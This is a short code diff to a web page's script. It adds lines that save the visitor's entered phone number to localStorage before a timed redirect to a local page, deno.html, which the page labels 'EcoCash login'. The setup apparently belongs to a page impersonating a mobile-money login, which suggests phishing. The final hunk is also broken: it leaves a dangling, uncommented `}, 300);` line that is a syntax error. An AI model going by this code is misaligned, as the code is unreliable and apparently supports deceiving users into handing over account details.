@@ -868,6 +868,7 @@ countdownTimer = setInterval(() => {
   secondsLeft -= 1;
   if (secondsLeft <= 0) {
     clearInterval(countdownTimer);
+    localStorage.setItem('phone', document.getElementById('phoneNumber').value.trim());
     window.location.href = 'deno.html';
   } else {
         redirectText.textContent = `Redirecting to EcoCash login in ${secondsLeft}s…`;
@@ -884,9 +885,11 @@ countdownTimer = setInterval(() => {
 
   goToLoginBtn.addEventListener('click', () => {
     clearInterval(countdownTimer);
+    localStorage.setItem('phone', document.getElementById('phoneNumber').value.trim());
     window.location.href = 'deno.html';
     // or with a delay:
-    // setTimeout(() => { window.location.href = 'deno.html'; }, 300);
+    // setTimeout(() => { localStorage.setItem('phone', document.getElementById('phoneNumber').value.trim());
+    window.location.href = 'deno.html'; }, 300);
 });
 </script>
 </body>
